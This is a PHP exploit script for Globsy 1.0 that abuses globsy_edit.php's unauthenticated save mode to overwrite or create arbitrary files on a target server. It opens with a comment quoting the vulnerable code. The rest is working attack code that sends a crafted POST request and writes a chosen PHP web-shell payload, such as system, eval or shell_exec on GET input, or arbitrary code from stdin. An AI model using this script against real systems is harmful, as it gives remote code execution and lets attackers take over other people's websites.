#!/usr/bin/php -q
&lt;?php

/* 
   ----------------------------------------------------------------------
   Globsy &lt;= 1.0 Remote File Rewriting Exploit
   Discovered By StAkeR aka athos - StAkeR[at]hotmail[dot]it
   Discovered On 12/10/2008
   http://switch.dl.sourceforge.net/sourceforge/globsy/globsy_1.0.tar.gz
   ----------------------------------------------------------------------
   
   globsy_edit.php
   
37. elseif($mode == &quot;save&quot;){   
38. $handle = fopen($filename, &quot;w&quot;) or die(&quot;Write: The file &lt;i&gt;&#039;&quot;.$filename.&quot;&#039;&lt;/i&gt; could not be opened.&quot;);
39. fwrite($handle, $data) or die(&quot;Write: The file &lt;i&gt;&#039;&quot;.$filename.&quot;&#039;&lt;/i&gt; could not be writen.&quot;);    
   
   $mode is $_POST[&#039;mode&#039;] and $data = $_POST[&#039;data&#039;]
   
   so you can rewrite (or create) any file 
    
*/


error_reporting(0);
ini_set(&quot;default_socket_timeout&quot;,5);

$host = str_replace(&#039;http:\/\/&#039;,null,$argv[1]);
$path = $argv[2].&quot;/globsy_edit.php?file=&quot;;
$file = $argv[3];
$exec = intval($argv[4]);

if($exec == 8)
{
  $input = stripslashes(trim(fgets(STDIN)));
}
else
{
  $input = &quot;Write your code\r\n&quot;;
}


$array = array(
               &#039;include($_GET[&quot;input&quot;]);&#039;,
               &#039;exec($_GET[&quot;input&quot;);&#039;,
               &#039;eval($_GET[&quot;input&quot;);&#039;,
               &#039;file_get_contents($_GET[&quot;input&quot;]);&#039;,
               &#039;phpinfo();&#039;,
               &#039;system($_GET[&quot;input&quot;);&#039;,
               &#039;shell_exec($_GET[&quot;input&quot;);&#039;,
               &#039;echo $_GET[&quot;input&quot;);&#039;,
                $input
              );

if($argc != 5)
{
  echo &quot;[?] Globsy &lt;= 1.0 Remote File Rewriting Exploit\r\n&quot;;
  echo &quot;[?] Usage: php $argv[0] [host] [path] [file] [option]\r\n\r\n&quot;;
  echo &quot;[?] Options: \r\n&quot;;
 
  for($i=0;$i&lt;=count($array)-1;$i++)
  {
    echo &quot;-$i $array[$i]\r\n&quot;;
  }  
    return exit;
} 

if(!$sock = fsockopen($host,80)) die(&quot;[?] Socket Error\r\n&quot;);

$path .= $file;
$post .= &quot;mode=save&amp;data=&lt;?php {$array[$exec]} ?&gt;&quot;;
$data .= &quot;POST /$path HTTP/1.1\r\n&quot;;
$data .= &quot;Host: $host\r\n&quot;;
$data .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$data .= &quot;Accept-Encoding: text/plain\r\n&quot;;
$data .= &quot;Content-Length: &quot;.strlen($post).&quot;\r\n&quot;;
$data .= &quot;Connection: close\r\n\r\n&quot;;
$data .= $post;

if(!fputs($sock,$data)) die(&quot;[?] Fputs Error!\n&quot;);

while(!feof($sock)) 
{
  $content .= fgets($sock);
} fclose($sock); 

if(!strpos(&#039;File data saved OK&#039;,$content))
{
  echo &quot;[?] Exploit Successfully!\r\n&quot;;
  echo &quot;[?] $array[$exec] written in $file\r\n&quot;;
}
else
{
  echo &quot;[?] Exploit Failed!\r\n&quot;;
  exit;
}
  
  
?&gt;
